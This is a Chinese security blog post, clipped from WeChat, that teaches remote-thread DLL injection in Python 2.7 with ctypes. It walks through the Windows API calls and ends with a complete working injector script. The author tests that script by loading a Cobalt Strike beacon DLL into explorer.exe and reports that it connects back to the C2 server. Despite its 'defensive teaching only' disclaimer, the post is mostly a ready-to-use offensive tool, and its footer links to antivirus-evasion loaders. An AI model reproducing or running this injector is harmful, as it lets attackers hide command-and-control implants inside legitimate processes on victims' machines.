> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/FW6iFbJ17ZXWzxnLg_Cm5A)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSNm0LR8A6BdSLiaobrMYza7Ee30DfhbRPYLDLfzggucCJTAptw6dsNLfTMME0pQBT6BBLkpCRCjuAg/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

最近被 dll 注入卡住了，再加上忙毕设，所以更新慢点。。。  

DLL 注入  

**DLL 注入**技术是进程注入的一种。是向一个正在运行的进程插入代码、注入代码并执行的过程，我们注入的代码以动态链接库 DLL 的形式存在，DLL 在运行时按需加载。  

dll 文件是动态链接库，是一个包含可由多个程序同时使用的代码和数据的库，和 exe 一样都是 PE 文件格式，DLL 不能直接运行需要调用，正常入口函数是 DllMain()。

本文通过 py2.7 使用 ctypes 库进行 DLL 注入实现，解读一下最基础的远程线程 DLL 注入的原理。

函数了解

主要需要了解 3 个 API 函数, 其他几个函数详解见《[维持访问 - 代码注入分析](http://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&mid=2247485494&idx=1&sn=44daf6f00b3c1ad0589e6e1987bac04b&chksm=977434d7a003bdc10e6de399cbb9aa029577cb8fcf59e75dd3f109c4807638fdfad091acf81d&scene=21#wechat_redirect)》  

> LoadLibrary 来动态加载 DLL 文件
> 
> GetProcAddress 用来从导出的函数或变量的地址
> 
> CreateRemoteThread 函数将创建一个新线程，该线程运行在另一个进程的虚拟地址空间。

LoadLibrary 函数  

LoadLibrary 可以动态加载 DLL 文件，加载到调用进程和内存中。

函数原型：

```
https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw
```

```
HMODULE LoadLibraryA(
  LPCSTR lpLibFileName
);
```

对应参数  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNm0LR8A6BdSLiaobrMYza7EyNRtVHyQCXVQdSTvkiaemzQic7O1ibCcTVpYcqYVb9ngntRXeIAoVa45g/640?wx_fmt=png)

调用成功则返回模块的句柄，失败则返回 Null。  

lpLibFileName 参数是 DLL 的绝对路径，通过调用该 API 并传入参数即可完成 DLL 加载。由于 API 函数在计算机中有固定的内存地址，在 dll 注入中我们需要的是该函数的内存地址。

通过创建远程线程方式调用该函数，并把 DLL 绝对路径传给它实现 DLL 注入。被加载的 dll 文件会自动运行 dll 文件中的 DllMain() 函数完成调用。

GetProcAddress 函数

GetProcAddress 用来从指定的动态链接库（DLL）检索导出的函数或变量的地址。

我们就用此函数从 kernel32.dll 库中获取 LoadLibraryA 函数的内存地址。

函数原型：

```
https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloader
```

```
api-getprocaddress
FARPROC GetProcAddress(
  HMODULE hModule,
  LPCSTR  lpProcName
);
```

 对应参数  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNm0LR8A6BdSLiaobrMYza7EPRpKRRkK51q2rrOBqMicuCyEn95ZXUcn60PV4UWjFYxclK33qCL4o0w/640?wx_fmt=png)

调用成功则返回指定函数的变量地址，失败则返回 Null。  

这里用 python 有很多坑，ctypes 库调用 GetProcAddress 函数时需要指定特定的参数类型，返回特定类型的值，才能得到 LoadLibraryA 所在的内存地址

```
ctypes.windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
ctypes.windll.kernel32.GetModuleHandleW.restype = c_void_p
handle = ctypes.windll.kernel32.GetModuleHandleW("kernel32")

ctypes.windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
ctypes.windll.kernel32.GetProcAddress.restype = c_void_p
LLA = ctypes.windll.kernel32.GetProcAddress(handle, b'LoadLibraryA')
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNm0LR8A6BdSLiaobrMYza7EMyXX1ibmlUs5OdIbehPzZQ9BfnaVwiaOptPlBL8PfRqr336Gc0lEqNPQ/640?wx_fmt=png)

后面几个 API 函数详解见上文《[维持访问 - 代码注入分析](http://mp.weixin.qq.com/s?__biz=MzIwOTMzMzY0Ng==&mid=2247485494&idx=1&sn=44daf6f00b3c1ad0589e6e1987bac04b&chksm=977434d7a003bdc10e6de399cbb9aa029577cb8fcf59e75dd3f109c4807638fdfad091acf81d&scene=21#wechat_redirect)》  

OpenProcess 函数

使用 OpenProcess 打开一个进程，并返回进程对象的句柄。

```
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,pid)
ctypes.windll.kernel32.CloseHandle(h_process)
```

VirtualAllocEx 函数  

在打开的进程内申请一块小内存，这次存放的不是 shellcode，而是 DLL 的绝对路径

```
dll_path = b"C:\\Users\\lcg17\\Desktop\\cs\\beacon64.dll"
```

绝对路径的获取可以使用 os 库来完成  

```
import os
shellcode = os.path.abspath('beacon64.dll')
# shellcode = "C:\\Users\\lcg17\\Desktop\\cs\\beacon64.dll"
shellcode = bytearray(shellcode)
arg_address = ctypes.windll.kernel32.VirtualAllocEx(h_process, 0, len(dll_path), 0x1000, 0x04)
```

WriteProcessMemory 函数

将 dll 绝对路径写入已打开程序申请的小内存中

```
shellcode = (ctypes.c_char * len(dll_path)).from_buffer(dll_path)
ctypes.windll.kernel32.WriteProcessMemory(h_process, arg_address, shellcode,len(dll_path), 0)
```

CreateRemoteThread 函数

可以在打开进程的虚拟地址空间中远程创建一个线程。

我们要用此函数实现：在指定进程创建一个线程，线程的动作是调用 LoadLibraryA 函数加载 DLL 文件。

函数原型上文讲过，这次重点是 4,5 参数

第 4 参数是调用函数的指针，传入 LoadLibraryA 内存地址，但传入时有个要求参数是一种类型的函数指针

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNm0LR8A6BdSLiaobrMYza7ERxIjvnC4X7YNX4jMbxJBLoYEYn6VpicZq8DFicibgtkI1M1roFp9hE2Pw/640?wx_fmt=png)

在 c 中转化简单，在 py 中需要用 ctypes 库将内存地址转为函数指针  

```
LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID)
start = LPTHREAD_START_ROUTINE(LLA)
```

第 5 个参数是则是传入 LoadLibraryA 需要的参数，也就是 DLL 绝对路径  

```
handle = ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, start, arg_address, 0, 0)
```

这样就完成了我们的 **dll 注入**。  

测试  

使用 CS 生成 64 位 beacon.dll，注入程序测试的 explorer，pid 为 2984  

py 源码

在测试源码的时候，发现 py 就是实现不了，ctypes 用不熟练很多的坑

经过半个月的摸索，改了几处问题，终于上线了。。。

```
import ctypes
from ctypes import *
from ctypes import wintypes
import sys,os

def inject(file,pid):
    PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
    h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if h_process:
        dll_path = os.path.abspath(file)
        print(dll_path)
        # dll_path = "C:\\Users\\lcg17\\Desktop\\cs\\beacon64.dll"
        dll_path = bytearray(dll_path)

        arg_address = ctypes.windll.kernel32.VirtualAllocEx(h_process, ctypes.c_int(0), ctypes.c_int(len(dll_path)),ctypes.c_int(0x3000), ctypes.c_int(0x04))
        buf = (ctypes.c_char * len(dll_path)).from_buffer(dll_path)
        ctypes.windll.kernel32.WriteProcessMemory(h_process, arg_address, buf, len(dll_path))

        ctypes.windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
        ctypes.windll.kernel32.GetModuleHandleW.restype = c_void_p
        handle = ctypes.windll.kernel32.GetModuleHandleW("kernel32")
        ctypes.windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
        ctypes.windll.kernel32.GetProcAddress.restype = c_void_p
        LLA = ctypes.windll.kernel32.GetProcAddress(handle, b'LoadLibraryA')
        print("LoadLibraryA:{}".format(LLA))

        LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID)
        start = LPTHREAD_START_ROUTINE(LLA)
        handle = ctypes.windll.kernel32.CreateRemoteThread(h_process, None, 0, start, arg_address, 0, 0)
        if handle:
            ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
            ctypes.windll.kernel32.CloseHandle(handle)
        else:
            print("create handle errer")
            sys.exit()
        ctypes.windll.kernel32.CloseHandle(h_process)
    else:
        print("open process error")
        sys.exit()

if __name__ == '__main__':
    inject(sys.argv[1],sys.argv[2])
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNm0LR8A6BdSLiaobrMYza7EbrIFyrojVkgI22aekDb95QHzF4iaxicHE2Pn5TGyjib3NrqUlu3ycbIRQ/640?wx_fmt=png)

成功上线 cs  

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNm0LR8A6BdSLiaobrMYza7ERkJdhN1Tia4RasgVCuwdpztg2cqLacCSMdhMicSZyjbDKPefEnrbFMBA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNm0LR8A6BdSLiaobrMYza7EohgK2QEpe70hKSFdy54gfiata2V8XFl8Us9rvFvjb1TJjIND8wNeic8g/640?wx_fmt=png)

注意

注意 DLL 文件位数要对应如果 DLL 被注入的进程是 64 位，那么应该使用 64 位有效负载，32 位程序应注入 32 位 dll 文件。  

****【往期推荐】****  

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - Shellcode Loader 原理 (python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - 分离 + 混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附 PoC】CVE-2021-2109 | Weblogic Server 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)

公众号